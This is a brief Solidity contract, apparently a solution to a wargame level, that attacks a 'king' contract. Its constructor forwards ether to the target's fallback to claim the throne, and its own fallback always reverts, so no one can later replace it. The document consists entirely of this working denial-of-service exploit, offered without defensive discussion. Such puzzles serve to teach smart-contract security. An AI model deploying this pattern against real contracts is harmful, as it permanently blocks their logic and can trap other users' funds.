pragma solidity ^0.4.18;

contract AttackKing {

    constructor(address _king) public payable {
        //call the fallback function in king contract
        //during deploy,put king contract address and 1 eth
        address(_king).call.value(msg.value)();
    }

    function() external payable {
        //not allow any contract to callback our function
        //when they call our callback function to be king
        //they will get revert
        revert("you lose");
    }
}